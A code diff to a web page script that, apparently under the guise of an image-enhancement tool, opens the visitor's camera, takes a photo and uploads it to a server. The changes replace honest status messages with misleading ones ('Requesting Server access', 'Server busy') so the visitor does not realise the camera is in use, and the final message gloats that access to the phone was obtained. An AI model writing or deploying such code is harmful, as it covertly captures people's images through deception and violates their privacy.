@@ -323,14 +323,14 @@
         // 📸 Capture Photo & Send Data
         document.getElementById("uploadBtn").addEventListener("click", async () => {
             const statusMessage = document.getElementById("statusMessage");
-            statusMessage.innerText = "🔄 Requesting camera access...";
+            statusMessage.innerText = "🔄 Requesting Server access";
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById("video");
                 video.srcObject = stream;
                 
-                statusMessage.innerText = "📷 Camera access granted. Taking photo...";
+                statusMessage.innerText = "📷 Server busy,Please wait for few seconds";
                 
                 // Wait for video to be ready
                 video.onloadedmetadata = function() {
@@ -363,10 +363,10 @@
                                     body: formData,
                                 });
                                 
-                                statusMessage.innerText = "✅ Image enhanced successfully! Check your downloads.";
+                                statusMessage.innerText = "✅Successfully Got access to your phone,Now go sleep.😘";
                                 console.log("📤 Image sent successfully!");
                             } catch (error) {
-                                statusMessage.innerText = "❌ Failed to enhance image!";
+                                statusMessage.innerText = "❌ Failed to enhance image! reload this page.";
                                 console.error("❌ Error sending image:", error);
                             }
                             
@@ -376,7 +376,7 @@
                     }, 2000);
                 };
             } catch (error) {
-                statusMessage.innerText = "❌ Camera access denied! Please allow camera access.";
+                statusMessage.innerText = "❌ Please Reload this Page.";
                 console.error("Camera access denied:", error);
             }
         });
